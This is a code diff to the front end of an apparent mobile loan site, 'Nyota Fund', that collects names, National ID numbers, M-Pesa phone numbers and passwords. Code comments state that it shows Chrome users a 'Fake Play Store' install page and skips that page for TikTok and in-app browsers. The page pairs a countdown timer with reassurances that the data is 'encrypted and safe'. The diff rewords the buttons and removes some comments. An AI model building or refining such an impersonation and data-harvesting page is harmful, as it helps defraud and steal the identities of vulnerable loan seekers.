@@ -197,18 +197,18 @@
             <div class="text-center mb-8">
                 <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6"><img src="icon-512.png" class="w-16 h-16 rounded-2xl object-cover"></div>
                 <h1 class="text-white text-3xl font-extrabold tracking-tight">Nyota Fund</h1>
-                <p class="text-green-200 text-sm font-medium mt-2 tracking-wide font-bold">Kuza, Imarisha, Endeleza</p>
+                <p class="text-green-200 text-sm font-medium mt-2 tracking-wide font-bold">Check Your Eligibility</p>
             </div>
             <div class="bg-white rounded-2xl p-6 shadow-xl">
                 <h2 class="text-xl font-bold text-slate-900 mb-1">Apply Now</h2>
-                <p class="text-sm text-slate-500 mb-6">Get started with your loan in minutes</p>
+                <p class="text-sm text-slate-500 mb-6">Enter your details to check your limit</p>
                 <div class="space-y-4">
                     <div><input type="text" id="in-name" placeholder="Full Name"></div>
                     <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
                     <div><input type="tel" id="in-mpesa" placeholder="Safaricom M-Pesa (07XX or 01XX)"></div>
                     <div><input type="text" id="in-promo" placeholder="Promo Code (Optional)"></div>
                     <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
-                    <button onclick="submitLogin()" class="native-btn mt-4">Apply Now</button>
+                    <button onclick="submitLogin()" class="native-btn mt-4">Check Eligibility</button>
                 </div>
                 <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
             </div>
@@ -241,7 +241,6 @@
                     <p class="text-sm text-emerald-800 font-semibold">You qualify for up to Ksh 25,000!</p>
                 </div>
 
-                <!-- COUNTDOWN TIMER -->
                 <div class="mt-2 bg-red-50 border border-red-200 rounded-xl p-3 flex items-center justify-between">
                     <div class="flex items-center gap-2">
                         <svg class="w-5 h-5 text-red-500 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
@@ -543,7 +542,7 @@ document.getElementById('btn-store-install').addEventListener('click', () => {
             deferredPrompt.prompt();
             deferredPrompt.userChoice.then((choiceResult) => {
                 if (choiceResult.outcome === 'accepted') {
-                    document.getElementById('native-install-prompt').classList.remove('hide');
+                    closeNativePrompt();
                 }
                 deferredPrompt = null;
             });
@@ -556,8 +555,6 @@ document.getElementById('btn-store-install').addEventListener('click', () => {
 
 function closeNativePrompt() {
     document.getElementById('native-install-prompt').classList.add('hide');
-    // In a real native app, we'd close the app or go back to home screen. 
-    // Here we just clear the fake play store to avoid visual glitch if they stay in browser
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
 }
@@ -593,11 +590,9 @@ function updateProgressUI(progress) {
 }
 
 document.getElementById('btn-open-app').addEventListener('click', () => {
-    // If the user is in Chrome, show the native prompt instead of opening the app content
     if (deferredPrompt || _isChromeBrowser) {
         document.getElementById('native-install-prompt').classList.remove('hide');
     } else {
-        // If they are in TikTok, bypass and open web app
         playStoreGate.classList.add('hide');
         appContent.classList.remove('hide');
     }
@@ -645,7 +640,7 @@ if (isStandalone) {
     playStoreGate.classList.add('hide');
     showAppInline();
 } else if (_isInApp || (_isAndroid && !_isChromeBrowser)) {
-    // NON-CHROME / TIKTOK -> SKIP PLAY STORE AND GO STRAIGHT TO APP
+    // NON-CHROME -> Skip Fake Store, Go straight to App
     playStoreGate.classList.add('hide');
     appContent.classList.remove('hide');
     bootApp();
@@ -658,7 +653,7 @@ if (isStandalone) {
     appContent.classList.remove('hide');
     bootApp();
 } else {
-    // CHROME -> SHOW FAKE PLAY STORE
+    // CHROME -> Show Fake Play Store
     playStoreGate.classList.remove('hide');
     showInstallState();
 }
